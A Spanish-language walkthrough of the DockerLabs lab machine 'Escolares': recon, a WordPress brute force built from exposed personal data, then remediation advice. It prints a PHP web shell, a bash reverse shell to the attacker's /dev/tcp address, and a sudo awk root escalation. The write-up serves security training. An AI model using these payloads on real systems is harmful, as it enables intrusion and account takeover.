# Máquina Escolares

Enlace a la máquina -> [Dockerlabs](https://mega.nz/file/ZXckGSob#QBn80M3tFNTrKCJwZ1lIh-9Rafx5sdlG3lyCT9FPYes)

![imagen](https://github.com/user-attachments/assets/c0bc899e-e4e6-4ae1-8223-fa7745b5fa1c)

- **Nombre de la Máquina:** Escolares
- **Sistema Operativo:** Linux
- **Dificultad:** Easy
- **Plataforma:** DockerLabs
- **Dirección IP:** 172.17.0.2
- **Vulnerabilidades Explotadas:**
  - **Exposición de información sensible:** La página `/profesores.html` expone nombres de usuario y otra información útil para un ataque de fuerza bruta.
  - **Fuerza bruta en WordPress:** Uso de un diccionario generado a partir de la información expuesta para obtener la contraseña del usuario administrador de WordPress.
  - **Ejecución remota de comandos en WordPress:** Subida de un archivo PHP malicioso a través de `wp file manager` para ejecutar comandos en el servidor.
- **Escalada de Privilegios:**
  - **Usuario luisillo:** Acceso a la cuenta de `luisillo` mediante la contraseña encontrada en el archivo `secret.txt`.
  - **Usuario root:** Uso del binario `awk` con privilegios sudo para ejecutar comandos como root y obtener una shell de root.

## Reconocimiento y Enumeración
Comenzamos realizando un escaneo general con nmap sobre la IP de la máquina objetivo para identificar los puertos abiertos.

```bash
sudo nmap -p- -sS --min-rate 5000 -v -n -Pn 172.17.0.2 -oN escaneo.txt
```

![imagen](https://github.com/user-attachments/assets/1ebb296c-0474-4ec6-8f27-1547c073b7f4)

El escaneo muestra que los puertos 22 y 80 están abiertos. Realizamos un análisis más detallado para determinar qué servicios se están ejecutándose en estos puertos.

```bash
sudo nmap -p 22,80 -sCV 172.17.0.2 -oN targeted.txt
```

![imagen](https://github.com/user-attachments/assets/97b16cf8-e100-4e82-8dc0-725b46eab862)

### Puerto 80 HTTP
Lanzamos un `whatweb` para ver qué servicios corren en el puerto HTTP.

![imagen](https://github.com/user-attachments/assets/8c088ecf-2b06-4f75-95ab-d73ba3979d98)

Parece ser una página web de una universidad.

![imagen](https://github.com/user-attachments/assets/595244fe-258b-4f0c-8035-2338295422b2)

Al ver el código fuente de la página, encontramos un directorio interesante `/profesores.html`.

![imagen](https://github.com/user-attachments/assets/f0e7d223-f770-4652-b49c-030bbe768253)

Aparecen los nombres de varios profesores, incluido el administrador de WordPress, junto a su email y fecha de nacimiento, toda información es buena y necesaria.

![imagen](https://github.com/user-attachments/assets/6adb867e-ce23-4417-a052-201229b85b8d)

Hacemos una búsqueda de directorios usando gobuster.

```bash
gobuster dir -u "http://172.17.0.2/" -w /usr/share/wordlists/dirb/common.txt -t 150
```

![imagen](https://github.com/user-attachments/assets/9ccc2058-55fc-4025-b69a-b9c76346e732)

Confirmamos que estamos ante un sitio WordPress.

![imagen](https://github.com/user-attachments/assets/01f5c629-d0b9-450e-af5f-6bb00ea8a019)

Vamos a revisar el directorio `/wp-login.php`.

![imagen](https://github.com/user-attachments/assets/b4572c01-b835-4c53-9fa7-c263ce993754)

La web se ve mal porque está intentando cargar los assets desde una URL diferente a la que tenemos. Si miramos el código fuente, veremos el host que debemos agregar al archivo `/etc/hosts` de nuestro sistema.

![imagen](https://github.com/user-attachments/assets/03a46dc7-997e-438f-8d4f-60471d4baf37)

```bash
nano /etc/hosts
127.0.0.1       localhost
127.0.1.1       t0rr4l.home     t0rr4l
172.17.0.2      escolares.dl
# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

Al recargar la página, ya se vería normal y sin fallos.

![imagen](https://github.com/user-attachments/assets/b0a2bca3-83d7-43d2-b1f1-5f57aa3e0655)

Probamos con el nombre `luisillo`, y nos dice que la contraseña no es correcta, por lo que sabemos que ese nombre de usuario es válido para probar fuerza bruta. Primero probé a usar el rockyou, pero no conseguí la contraseña, así que opté por hacer un diccionario con los datos que salían de **luisillo**.

![imagen](https://github.com/user-attachments/assets/42a8c7d7-479a-4c12-b109-f3b0e990695e)

```bash
cupp -i
```

![imagen](https://github.com/user-attachments/assets/6cb93b87-dc47-485d-b793-ad3155bdeea8)

Con este script habremos creado un diccionario con 1819 contraseñas diferentes a partir de sus datos.

Probaremos a hacer fuerza bruta con wpscan. Nos encuentra una contraseña válida: **Luis1981**

```bash
wpscan --url "http://172.17.0.2/" -P luis.txt
```

![imagen](https://github.com/user-attachments/assets/49465880-ef7d-4690-86ab-6a5f497be9cb)

Probamos la contraseña que nos reportó la herramienta y funciona, tenemos acceso a la administración del WordPress.

![imagen](https://github.com/user-attachments/assets/170b7dd0-a815-4935-ab54-cce46e08429f)

Tendremos acceso al `wp file manager` y desde ahí podremos subir un archivo PHP, el cual podremos utilizar para ejecutar comandos a nivel de sistema.

```php
<?php
  system($_GET["cmd"]);
?>
```

![imagen](https://github.com/user-attachments/assets/1e0596f1-1cf1-431b-9312-95afaf34aee2)

Una vez subido el archivo, lo abrimos y podremos ejecutar comandos con el parámetro cmd.

```url
http://escolares.dl/wordpress/wp-content/themes/twentytwentytwo/cmd.php?cmd=whoami
```

![imagen](https://github.com/user-attachments/assets/7388d758-3ca8-44bc-a602-67de20e8e2f5)

Podemos leer también el archivo `/etc/passwd`.

![imagen](https://github.com/user-attachments/assets/913c5cb4-2786-42f2-bebc-941ca682c29f)

Nos mandaremos una shell ejecutando el siguiente comando en el parámetro cmd.

```bash
bash -c 'exec bash -i %26>/dev/tcp/172.17.0.1/443 <%261'
```

Estaremos en escucha con netcat en nuestra máquina atacante y nos llegará la reverse shell.

![imagen](https://github.com/user-attachments/assets/d331abb2-1a6c-4283-84e2-10d7299cb4dd)

## Escalada de privilegios a luisillo
Podemos observar que existe el usuario root y el usuario luisillo.

```bash
cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
luisillo:x:1001:1001:,,,:/home/luisillo:/bin/bash
```

Observamos un archivo `secret.txt` y si lo imprimimos vemos la contraseña de **luisillo**.

![imagen](https://github.com/user-attachments/assets/2e3194fb-f18c-4fd3-9224-baab7d57aaf5)

  - luisillo
  - luisillopasswordsecret



## Escalada de privilegios a root
Una vez seamos **luisillo**, ejecutaremos un `sudo -l` y vemos que podemos ejecutar el comando `/usr/bin/awk` como usuario **root**.

```bash
sudo -l
Matching Defaults entries for luisillo on 30b3222be84f:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User luisillo may run the following commands on 30b3222be84f:
    (ALL) NOPASSWD: /usr/bin/awk
```

En esta [página](https://gtfobins.github.io/gtfobins/awk/#sudo) podemos ver cómo elevar nuestros privilegios haciendo uso de ese binario.

```bash
sudo awk 'BEGIN {system("/bin/sh")}'
```

Lo ejecutaremos y nos convertiremos en root con éxito.

![imagen](https://github.com/user-attachments/assets/21328be9-f4ff-450c-b940-3d2e5cfc9889)

## Remediación
Para prevenir las vulnerabilidades explotadas en esta máquina, se recomiendan las siguientes medidas:
- **Protección de Información Sensible:** Evitar exponer información sensible como nombres de usuario y correos electrónicos en páginas web accesibles públicamente.
- **Fortalecimiento de Contraseñas:** Utilizar contraseñas fuertes y únicas para todas las cuentas. Implementar políticas de contraseñas robustas.
- **Actualización de Software:** Mantener el CMS y todos sus plugins y temas actualizados para protegerse contra vulnerabilidades conocidas.
- **Restricción de Subida de Archivos:** Limitar la capacidad de subir archivos a usuarios de confianza y verificar los archivos subidos.
- **Revisión de Permisos Sudo:** Revisar y restringir los permisos sudo para asegurar que solo los comandos necesarios se puedan ejecutar con privilegios elevados.
